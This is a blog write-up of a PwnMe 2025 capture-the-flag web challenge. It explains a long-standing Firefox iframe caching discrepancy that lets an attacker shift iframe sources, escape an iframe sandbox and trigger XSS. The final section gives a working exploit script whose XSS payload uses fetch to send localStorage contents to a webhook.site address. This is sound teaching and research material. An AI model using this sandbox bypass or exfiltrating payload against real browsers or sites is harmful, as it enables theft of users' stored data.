---
source: kevin-mizu
source_url: https://mizu.re/post/an-18-years-old-bug
title: "An 18 years old bug | mizu.re"
description: "An 18 years old bug"
---

_keyboard\_arrow\_up_

title: An 18 years old bug

date: Mar 01, 2025

tags: [Writeup](https://mizu.re/tag/Writeup) [PwnMe2025](https://mizu.re/tag/PwnMe2025) [Web](https://mizu.re/tag/Web) [Browser](https://mizu.re/tag/Browser)

# An 18 years old bug

![](https://mizu.re/articles/writeups/Pwnme_2025/An_18_years_old_bug/images/pwnme2025.png)

* * *

Difficulty: 500 points \| 2 solves

Description: I've heard that Firefox's sandboxed iframe has a breach! I won't believe it until I see it with my own eyes.

Could you help me finding it?

Author: [@Geluchat](https://x.com/Geluchat) and [Me](https://x.com/kevin_mizu)

Sources: [here](https://mizu.re/articles/writeups/Pwnme_2025/An_18_years_old_bug/an_18_years_old_bug.zip).

* * *

## Table of content

- [📜 Introduction](https://mizu.re/post/an-18-years-old-bug#introduction)
- [🗃️ Firefox's caching discrepancy](https://mizu.re/post/an-18-years-old-bug#firefoxs-caching-discrepancy)
- [🔥 Final Chain](https://mizu.re/post/an-18-years-old-bug#final-chain)

## [📜 Introduction](https://mizu.re/post/an-18-years-old-bug\#introduction)

This challenge was created based on a bug that [@Geluchat](https://x.com/Geluchat) discovered a year ago. After playing around with it, he found that this issue had been known and reported to Firefox for over 18 years :)

That being said, let's dive into the challenge! Since the goal was to find something "undocumented", the website was kept very simple.

![demo.gif](https://mizu.re/articles/writeups/Pwnme_2025/An_18_years_old_bug/images/demo.gif)

**Fig. 1**: Challenge demo.

This was the backend source code:

```js
app.get("/", (req, res) => {
    var url = req.query.url || req.cookies.url || "/sandbox?html=Hello World!";
    res.cookie("url", url);
    res.set("Cache-Control", "public, max-age=30");
    res.render("index", { url: url });
})

app.get("/sandbox", (_, res) => {
    res.set("X-Frame-Options", "sameorigin");
    res.render("sandbox");
})

app.get("/bot", async (req, res) => {
    res.set("Content-Type", "text/plain");
    if (req.query.url?.startsWith("http")) {
        await goto(req.query.url);
        res.send("URL checked by the bot!");
    } else {
        res.send("The ?url= parameter must starts with http!");
    }
})
```

**Fig. 2**: /src/app.js

This was the / source code:

```html
<form method="GET" action="/" class="mb">
    <h2>Which link do you want to safely visit?</h2>
    <input name="url" value="">
</form><br>
<hr>
<iframe sandbox src="<%= url %>" class="mt" frameBorder="0" width="80%" height="800"></iframe>
<iframe src=":)" hidden></iframe>
```

**Fig. 3**: /src/views/index.ejs

And this was the /sandbox source code:

```html
<script>
    if (top !== window && top.location.origin === window.location.origin) {
        var params = new URLSearchParams(location.search);
        document.body.innerHTML = params.get("html");
    }
</script>
```

**Fig. 4**: /src/views/sandbox.ejs

So, in short:

1. There is some caching on / (Cache-Control: public, max-age=30).
2. On /, it is possible to control the src attribute of a sandboxed <iframe>.
3. On /sandbox, an XSS vulnerability exists if the parent origin is the same as the current origin.

We quickly understand (if the challenge description isn't clear enough) that we need to bypass the iframe's sandbox to load /sandbox directly on the challenge website.

Additionally, something important that will make sense a bit later is that the bot calls location.reload after visiting the user-provided link.

```js
await page.goto("http://127.0.0.1:3000");
await page.evaluate((flag) => {
    localStorage.setItem("flag", flag);
}, process.env.FLAG || "PWNME{FAKE_FLAG}");

try {
    await page.goto(url);
    await sleep(3 * 1000);
    await page.evaluate(() => {
        location.reload();
    })
    await sleep(1 * 1000);
} catch(error) {
    console.error(`Error navigating to URL: ${error}`);
}
await browser.close();
```

**Fig. 5**: /src/bot.js

## [🗃️ Firefox's caching discrepancy](https://mizu.re/post/an-18-years-old-bug\#firefoxs-caching-discrepancy)

Now that we have a general idea of the challenge's goal, we can dive into the 18-year-old Firefox issue that need to be exploited :)

![Bug icon](https://mizu.re/articles/writeups/Pwnme_2025/An_18_years_old_bug/images/favicon.ico)

365580 - Firefox displays cached iFrame instead of the new iFrame SRC that is defined.


NEW \| nobody in \[Core - DOM: Navigation\], Last updated 2024-03-05


[https://bugzilla.mozilla.org/show\_bug.cgi?id=356558](https://bugzilla.mozilla.org/show_bug.cgi?id=356558)

Several additional issues related to the same concept can be found publicly:

- [https://bugzilla.mozilla.org/show\_bug.cgi?id=1459147](https://bugzilla.mozilla.org/show_bug.cgi?id=1459147)
- [https://bugzilla.mozilla.org/show\_bug.cgi?id=1851015](https://bugzilla.mozilla.org/show_bug.cgi?id=1851015)
- ...

_There is also [this one](https://bugzilla.mozilla.org/show_bug.cgi?id=1732513) related to srcdoc caching which remind me of the [@IcesFont](https://x.com/IcesFont) [recent challenge](https://blog.huli.tw/2024/09/07/en/idek-ctf-2024-iframe/)._

In short, Firefox has a discrepancy between the DOM and the rendered page when using Cache-Control with <iframe>. To trigger this bug, you need to:

1. Store an <iframe>'s src attribute.
2. Cache a page with that configuration.
3. Update the cached value with a new src.
4. Navigate to the cached page.
5. Reload the page using \[CTRL\] + \[R\] or location.reload (navigating alone isn't sufficient).

Your browser does not support the video tag.

**Fig. 6**: Firefox <iframe> caching discrepancy.

As demonstrated in the video above, on Firefox, by exploiting the caching mechanism, the DOM can retain the originally set <iframe> src value while the page renders the subsequently updated <iframe> src value.

Furthermore, what makes this bug even more interesting is that, under some conditions, it can shift the <iframe> src rendering states!

![firefox-shift-iframes.png](https://mizu.re/articles/writeups/Pwnme_2025/An_18_years_old_bug/images/firefox-shift-iframes.png)

**Fig. 7**: Firefox <iframe> src shifting.

There are probably many ways to trigger the caching and shifting bugs, but one method that [@Geluchat](https://x.com/Geluchat) discovered is by updating the src attribute with an invalid value. For instance:

- file:x
- about:x
- resource:x
- chrome:x
- moz-page-thumb:x
- page-icon:x
- ...

_These values are listed here: [https://searchfox.org/mozilla-central/source/caps/nsScriptSecurityManager.cpp#1027](https://searchfox.org/mozilla-central/source/caps/nsScriptSecurityManager.cpp#1027). Actually, we didn't find a way to trigger the error using a common HTTP wrapper._

Thus, by chaining the shifting with the caching issue, we can force the first <iframe> to use its originally assigned src while the second <iframe> renders the updated src. This allows to control the displayed src of an <iframe> even when we do not have direct control over its src attribute! :)

Your browser does not support the video tag.

**Fig. 8**: Firefox <iframe> src shifting.

Since this issue enables shifting <iframe>'s src, if a second <iframe> (without sandbox restrictions) appears after the user-controlled sandboxed <iframe>, it is possible to hijack that <iframe> and render a controlled origin into it! 🔥

Your browser does not support the video tag.

**Fig. 9**: Firefox <iframe> sandbox bypass.

We now have everything we need to solve this challenge :)

## [🔥 Final Chain](https://mizu.re/post/an-18-years-old-bug\#final-chain)

By automating the bug and leaving the bot on the page (which needs to be reloaded), we obtain the following final exploitation chain:

1. Set the sandboxed <iframe>'s src attribute to the /sandbox URL, including an XSS payload that leaks the flag from local storage.
2. Redirect the user to a page with a unique ID in the query string to cache the state along with the XSS payload.
3. Open a new window with an invalid <iframe> src (e.g., about:version) to force the caching mechanism to shift the <iframe>.
4. Wait for the bot to refresh the main window.
5. XSS! :)

```html
<script>
    var DOMAIN   = "http://127.0.0.1:3000";
    var LEAK_URL = "https://webhook.site/ebb2df51-048f-482e-99df-be7572cb7e5d";

    if (location.search === "?start") {
        let win = open(`${DOMAIN}?url=/sandbox?html=<img src="x" onerror="fetch('${LEAK_URL}?localStorage='.concat(localStorage.getItem('flag')))">`);
        setTimeout(() => {
            win.location.href = "?step2";
            location.href = `${DOMAIN}?${crypto.randomUUID()}`;
        }, 500);
    }

    if (location.search === "?step2") {
        setTimeout(() => {
            location.href = `${DOMAIN}?url=about:preferences`;
        }, 1000);
    }
</script>
```

- Flag: PWNME{39aecf9e5936d6a7825fba059efcc166}

[_keyboard\_arrow\_left_ FCSC 2025 Writeups](https://mizu.re/post/fcsc-2025-writeups)

[Exploring the DOMPurify library: Hunting for Misconfigurations (2/2) _keyboard\_arrow\_right_](https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations)